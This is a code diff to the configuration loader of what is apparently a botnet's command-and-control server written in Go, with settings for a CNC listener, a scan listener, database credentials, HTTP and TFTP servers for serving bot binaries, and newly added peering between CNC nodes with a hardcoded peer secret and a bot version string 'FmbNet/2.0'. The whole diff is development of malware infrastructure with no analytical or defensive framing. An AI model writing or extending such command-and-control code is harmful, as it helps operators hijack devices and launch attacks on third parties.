@@ -6,18 +6,23 @@ import (
 )
 
 type Config struct {
-	CncListen   string `json:"cnc_listen"`
-	AdminListen string `json:"admin_listen"`
-	ScanListen  string `json:"scan_listen"`
-	ProtoKey    string `json:"proto_key"`
-	MysqlAddr   string `json:"mysql_addr"`
-	MysqlUser   string `json:"mysql_user"`
-	MysqlPass   string `json:"mysql_pass"`
-	MysqlTable  string `json:"mysql_table"`
-	HttpServer  string `json:"http_server"`
-	TftpServer  string `json:"tftp_server"`
-	BinPrefix   string `json:"bin_prefix"`
-	BinPath     string `json:"bin_path"`
+	CncListen    string   `json:"cnc_listen"`
+	AdminListen  string   `json:"admin_listen"`
+	ScanListen   string   `json:"scan_listen"`
+	ProtoKey     string   `json:"proto_key"`
+	MysqlAddr    string   `json:"mysql_addr"`
+	MysqlUser    string   `json:"mysql_user"`
+	MysqlPass    string   `json:"mysql_pass"`
+	MysqlTable   string   `json:"mysql_table"`
+	HttpServer   string   `json:"http_server"`
+	TftpServer   string   `json:"tftp_server"`
+	BinPrefix    string   `json:"bin_prefix"`
+	BinPath      string   `json:"bin_path"`
+	CncID        int      `json:"cnc_id"`
+	CncPeers     []string `json:"cnc_peers"`
+	PeerSecret   string   `json:"peer_secret"`
+	PeerListen   string   `json:"peer_listen"`
+	BotVersion   string   `json:"bot_version"`
 }
 
 var cfg *Config
@@ -60,6 +65,18 @@ func loadConfig(path string) (*Config, error) {
 	}
 	if c.BinPath == "" {
 		c.BinPath = "/var/www/html/bins"
+	}
+	if c.CncID == 0 {
+		c.CncID = 1
+	}
+	if c.PeerSecret == "" {
+		c.PeerSecret = "botnetvmc0redev012"
+	}
+	if c.PeerListen == "" {
+		c.PeerListen = "0.0.0.0:34133"
+	}
+	if c.BotVersion == "" {
+		c.BotVersion = "FmbNet/2.0"
 	}
 	cfg = new(Config)
 	*cfg = c
